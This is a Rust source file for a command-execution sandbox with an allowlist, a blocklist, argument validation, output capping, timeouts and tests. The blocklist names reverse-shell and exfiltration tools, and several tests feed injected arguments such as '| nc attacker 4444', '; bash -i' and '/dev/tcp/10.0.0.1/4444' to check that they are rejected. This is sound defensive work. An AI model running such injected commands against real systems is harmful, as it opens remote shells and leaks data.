//! Sandbox — allowlist-based command execution with workspace scoping.

use std::process::Stdio;
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncReadExt};
use tokio::process::Command;
use tokio::time::timeout;

/// Hard bounds on the caller-supplied timeout (seconds).
const MIN_TIMEOUT_SECS: u64 = 1;
const MAX_TIMEOUT_SECS: u64 = 300;

#[derive(Debug)]
pub struct ExecOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    /// Whether stdout or stderr hit `MAX_OUTPUT` and was cut short.
    pub truncated: bool,
}

// Read-only system-inspection commands only. Network-egress tools (curl, wget,
// ping) are deliberately excluded — they enable SSRF (e.g. cloud metadata at
// 169.254.169.254) and data exfiltration. `find` is excluded because `-exec`
// turns it into an arbitrary-command primitive, and `journalctl` can read broad
// host logs. Re-enable any of these only behind an explicit, arg-restricted
// policy (tracked for the 0.6 sandbox-enforcement work).
const DEFAULT_ALLOWED: &[&str] = &[
    "ls", "cat", "head", "tail", "wc", "grep", "df", "du", "uname", "hostname", "ip", "ss", "ps",
    "top", "free", "lsblk", "lscpu", "sensors",
];

const BLOCKED: &[&str] = &[
    "rm", "dd", "mkfs", "shutdown", "reboot", "poweroff", "halt", "init", "kill", "pkill", "mount",
    "fdisk", "iptables", "nft", // Reverse shell / network exfil tools
    "nc", "ncat", "socat", "telnet", "nmap", "bash", "sh", "zsh", "python", "python3", "perl",
    "ruby", "php", "lua", "node", "gcc", "cc", "make", "chmod", "chown",
];

const MAX_OUTPUT: usize = 1_048_576; // 1 MB

/// Read `r` to EOF, keeping at most `cap` bytes; the flag reports whether more
/// was available. Stops reading (and drops `r`) as soon as the cap is exceeded.
async fn read_capped<R: AsyncRead + Unpin>(r: R, cap: usize) -> std::io::Result<(Vec<u8>, bool)> {
    let mut buf = Vec::new();
    r.take(cap as u64 + 1).read_to_end(&mut buf).await?;
    let cut = buf.len() > cap;
    buf.truncate(cap);
    Ok((buf, cut))
}

pub struct SandboxManager {
    allowed: Vec<String>,
}

impl SandboxManager {
    pub fn new() -> Self {
        Self {
            allowed: DEFAULT_ALLOWED.iter().map(|s| s.to_string()).collect(),
        }
    }

    pub async fn execute(
        &self,
        command: &str,
        args: &[String],
        workspace: Option<&str>,
        timeout_secs: u64,
    ) -> Result<ExecOutput, String> {
        // The lists name programs, resolved on PATH. A caller-supplied path is
        // refused outright: `/tmp/x/ls` has an allowed basename but would run
        // whatever binary sits at that path.
        if command.is_empty()
            || !command
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
        {
            return Err("Command must be a bare program name (no path)".into());
        }

        // Check against blocklist
        if BLOCKED.contains(&command) {
            return Err(format!("Command blocked: {command}"));
        }

        // Check allowlist
        if !self.allowed.iter().any(|a| a == command) {
            return Err(format!("Command not allowed: {command}"));
        }

        // Validate workspace path (prevent traversal); use the *canonical* path as
        // the working directory so the check and the exec see the same target.
        let mut workdir: Option<std::path::PathBuf> = None;
        if let Some(ws) = workspace {
            let canonical =
                std::fs::canonicalize(ws).map_err(|e| format!("Invalid workspace: {e}"))?;
            if !canonical.starts_with("/tmp") && !canonical.starts_with("/home") {
                return Err("Workspace must be under /tmp or /home".into());
            }
            workdir = Some(canonical);
        }

        // Validate args don't contain path traversal or shell metacharacters.
        // (No shell is spawned, so this is defense-in-depth; the allowlist is the
        // primary control.)
        for arg in args {
            if arg.contains("..") {
                return Err("Path traversal detected in arguments".into());
            }
            if arg.contains('|')
                || arg.contains(';')
                || arg.contains('`')
                || arg.contains("$(")
                || arg.contains("${")
                || arg.contains("/dev/tcp")
                || arg.contains("mkfifo")
            {
                return Err("Shell metacharacter detected in arguments".into());
            }
        }

        let timeout_secs = timeout_secs.clamp(MIN_TIMEOUT_SECS, MAX_TIMEOUT_SECS);

        let mut cmd = Command::new(command);
        cmd.args(args)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        if let Some(dir) = &workdir {
            cmd.current_dir(dir);
        }

        let mut child = cmd.spawn().map_err(|e| format!("Execution failed: {e}"))?;
        let (Some(stdout), Some(stderr)) = (child.stdout.take(), child.stderr.take()) else {
            return Err("Execution failed: output pipes unavailable".into());
        };

        // Read at most MAX_OUTPUT bytes of each stream. A reader that hits the
        // cap returns and drops its pipe, so a runaway writer (`cat /dev/zero`)
        // dies of SIGPIPE instead of growing our buffer until the edge device
        // runs out of memory. The timeout bounds the rest: on expiry the future
        // is dropped and kill_on_drop kills the process — preventing an
        // unbounded blocking command (e.g. `tail -f`) from hanging.
        let run = async {
            let (out, err) = tokio::join!(
                read_capped(stdout, MAX_OUTPUT),
                read_capped(stderr, MAX_OUTPUT)
            );
            let status = child.wait().await;
            (out, err, status)
        };
        let (out, err, status) = match timeout(Duration::from_secs(timeout_secs), run).await {
            Ok(done) => done,
            Err(_) => return Err(format!("Command timed out after {timeout_secs}s")),
        };
        let (stdout, stdout_cut) = out.map_err(|e| format!("Execution failed: {e}"))?;
        let (stderr, stderr_cut) = err.map_err(|e| format!("Execution failed: {e}"))?;
        let status = status.map_err(|e| format!("Execution failed: {e}"))?;

        Ok(ExecOutput {
            // Lossy decoding copes with a multi-byte character cut at the cap
            // (the old `String::truncate` panicked there — fatal under
            // panic = "abort").
            stdout: String::from_utf8_lossy(&stdout).into_owned(),
            stderr: String::from_utf8_lossy(&stderr).into_owned(),
            exit_code: status.code().unwrap_or(-1),
            truncated: stdout_cut || stderr_cut,
        })
    }

    pub fn allowed_commands(&self) -> Vec<String> {
        self.allowed.clone()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allowed_commands_populated() {
        let sm = SandboxManager::new();
        let cmds = sm.allowed_commands();
        assert!(cmds.contains(&"ls".to_string()));
        assert!(cmds.contains(&"cat".to_string()));
        assert!(cmds.contains(&"grep".to_string()));
        assert!(cmds.len() >= 15);
    }

    #[test]
    fn egress_and_escape_tools_not_in_default_allowlist() {
        let sm = SandboxManager::new();
        let cmds = sm.allowed_commands();
        for forbidden in ["curl", "wget", "ping", "find", "journalctl"] {
            assert!(
                !cmds.contains(&forbidden.to_string()),
                "{forbidden} must not be in the default allowlist (SSRF/exfil/escape)"
            );
        }
    }

    #[tokio::test]
    async fn blocked_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("rm", &[], None, 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("blocked"));
    }

    #[tokio::test]
    async fn unlisted_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ffmpeg", &[], None, 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    #[tokio::test]
    async fn path_traversal_in_args_rejected() {
        let sm = SandboxManager::new();
        let result = sm
            .execute("ls", &["../../etc/passwd".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("traversal"));
    }

    #[tokio::test]
    async fn allowed_command_executes() {
        let sm = SandboxManager::new();
        let result = sm.execute("uname", &["-s".to_string()], None, 30).await;
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(output.stdout.contains("Linux"));
        assert_eq!(output.exit_code, 0);
    }

    #[tokio::test]
    async fn ls_with_workspace() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/tmp"), 30).await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap().exit_code, 0);
    }

    #[tokio::test]
    async fn bad_workspace_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/etc"), 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Workspace must be"));
    }

    #[tokio::test]
    async fn command_paths_rejected() {
        let sm = SandboxManager::new();
        // A path is never resolved against the lists: `/tmp/x/ls` has an
        // allowed basename but would run an arbitrary binary.
        for cmd in ["/usr/bin/rm", "/tmp/x/ls", "./ls", "../bin/ls", "ls ", ""] {
            let err = sm.execute(cmd, &[], None, 30).await.unwrap_err();
            assert!(err.contains("bare program name"), "{cmd:?}: {err}");
        }
    }

    #[tokio::test]
    async fn runaway_output_is_capped_without_buffering_it_all() {
        let sm = SandboxManager::new();
        // `cat /dev/zero` never ends on its own; the capped reader must cut it
        // off (SIGPIPE) well before the timeout rather than buffer forever.
        let started = std::time::Instant::now();
        let out = sm
            .execute("cat", &["/dev/zero".to_string()], None, 30)
            .await
            .unwrap();
        assert!(out.truncated);
        assert_eq!(out.stdout.len(), MAX_OUTPUT);
        assert!(started.elapsed() < Duration::from_secs(20));
    }

    #[tokio::test]
    async fn cap_inside_a_multibyte_character_does_not_panic() {
        // 0xE2 0x82 0xAC = '€'; cap after the first byte of the second one.
        let data = "€€".as_bytes();
        let (buf, cut) = read_capped(data, 4).await.unwrap();
        assert!(cut);
        assert_eq!(buf, &data[..4]);
        assert_eq!(String::from_utf8_lossy(&buf), "€\u{FFFD}");
    }

    #[tokio::test]
    async fn blocked_commands_comprehensive() {
        let sm = SandboxManager::new();
        for cmd in [
            "dd", "mkfs", "shutdown", "reboot", "kill", "mount", "iptables",
        ] {
            let result = sm.execute(cmd, &[], None, 30).await;
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[tokio::test]
    async fn stderr_captured() {
        let sm = SandboxManager::new();
        // ls a nonexistent path should produce stderr
        let result = sm
            .execute("ls", &["/nonexistent_path_xyz".to_string()], None, 30)
            .await;
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(!output.stderr.is_empty());
        assert_ne!(output.exit_code, 0);
    }

    #[tokio::test]
    async fn reverse_shell_tools_blocked() {
        let sm = SandboxManager::new();
        for cmd in [
            "nc", "ncat", "socat", "bash", "sh", "python3", "perl", "ruby", "php",
        ] {
            let result = sm.execute(cmd, &[], None, 30).await;
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[tokio::test]
    async fn shell_metacharacters_in_args_blocked() {
        let sm = SandboxManager::new();

        let result = sm
            .execute("ls", &["| nc attacker 4444".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));

        let result = sm.execute("ls", &["; bash -i".to_string()], None, 30).await;
        assert!(result.is_err());

        let result = sm
            .execute("cat", &["$(whoami)".to_string()], None, 30)
            .await;
        assert!(result.is_err());

        let result = sm.execute("cat", &["`id`".to_string()], None, 30).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn dev_tcp_in_args_blocked() {
        let sm = SandboxManager::new();
        let result = sm
            .execute("cat", &["/dev/tcp/10.0.0.1/4444".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));
    }

    #[tokio::test]
    async fn long_running_command_times_out() {
        let sm = SandboxManager::new();
        // `tail -f /dev/null` blocks forever; the 1s timeout must kill it.
        let result = sm
            .execute(
                "tail",
                &["-f".to_string(), "/dev/null".to_string()],
                None,
                1,
            )
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("timed out"));
    }
}
